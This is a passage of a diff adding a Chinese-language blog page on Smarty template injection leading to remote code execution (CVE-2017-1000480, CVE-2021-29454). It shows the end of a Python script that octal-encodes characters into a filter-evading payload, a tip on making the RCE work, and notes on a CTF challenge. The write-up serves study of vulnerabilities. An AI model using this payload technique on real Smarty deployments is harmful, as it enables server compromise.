<span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">        string += <span class="string">&#x27;\\&quot;&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">        string += <span class="string">&#x27;(&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">        string += <span class="string">&#x27;)&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        string += <span class="string">&#x27;,&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    string += <span class="string">&#x27;\\\\&#x27;</span> + <span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(string)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>tips:<br>构造RCE的时候，函数名称要用(“”)包含起来，不然利用不成功，调试过程中没发现smarty的特殊要求</p>
+</blockquote>
+<p>ref：<a target="_blank" rel="noopener" href="https://250.ac.cn/2022/03/22/CVE-2021-29454/#smarty">https://250.ac.cn/2022/03/22/CVE-2021-29454/#smarty</a></p>
+<h3 id="0x2-例题"><a href="#0x2-例题" class="headerlink" title="0x2 例题"></a>0x2 例题</h3><p>2022红明谷杯 Smarty Caculator</p>
+<p>存在源码泄露（工具跑了一个晚上，才找到……）</p>
+<p>根据版本对比github版本，仅三个文件被修改，然后就盯着被修改的地方死活想不明白跟这个cve有什么关系……</p>
+<blockquote>
+<p>后来才绕出来，例题版本&lt;CVE版本，该CVE可以直接利用……麻了，陷入了思维定式</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-1000480"><span class="toc-number">1.</span> <span class="toc-text">CVE-2017-1000480</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%BD%8D"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 漏洞定位</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cve%E6%8F%8F%E8%BF%B0-%E5%8E%82%E5%95%86%E4%BF%AE%E8%A1%A5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">cve描述+厂商修补位置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 漏洞触发原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">原理分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-poc"><span class="toc-number">1.3.</span> <span class="toc-text">0x3 poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-29454"><span class="toc-number">2.</span> <span class="toc-text">CVE-2021-29454</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">0x1 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E7%AC%A6RCE"><span class="toc-number">2.1.1.</span> <span class="toc-text">无字符RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AEreg%E6%89%BE%E6%BC%8F%E7%BD%91%E4%B9%8B%E9%B1%BC"><span class="toc-number">2.1.2.</span> <span class="toc-text">根据reg找漏网之鱼</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-%E4%BE%8B%E9%A2%98"><span class="toc-number">2.2.</span> <span class="toc-text">0x2 例题</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&text=php-smarty模版注入RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&title=php-smarty模版注入RCE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&is_video=false&description=php-smarty模版注入RCE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php-smarty模版注入RCE&body=Check out this article: http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&title=php-smarty模版注入RCE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&title=php-smarty模版注入RCE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&title=php-smarty模版注入RCE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&title=php-smarty模版注入RCE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&name=php-smarty模版注入RCE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&t=php-smarty模版注入RCE"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2022
+    White Bai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
